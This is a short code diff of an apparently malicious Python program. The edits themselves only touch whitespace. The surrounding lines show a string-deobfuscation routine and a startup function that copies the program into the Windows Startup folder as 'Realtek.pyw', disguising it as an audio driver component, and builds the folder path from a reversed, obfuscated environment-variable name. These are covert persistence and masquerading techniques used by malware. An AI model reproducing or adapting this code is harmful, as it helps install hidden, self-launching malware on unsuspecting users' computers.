@@ -348,7 +348,6 @@ def create_copy_and_return_new_path():
     
     return new_path
 
-
 def deobf(encrypted_text, key):
     decrypted = [0] * 256
     for i, char in enumerate(key):
@@ -405,9 +404,10 @@ def startup():
     try:
         if getattr(sys, 'frozen', False):
             path = sys.executable
+            
         else:
             path = __file__
-        
+
         startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
         if not isfile(startuppath):
             if ".py" in path:
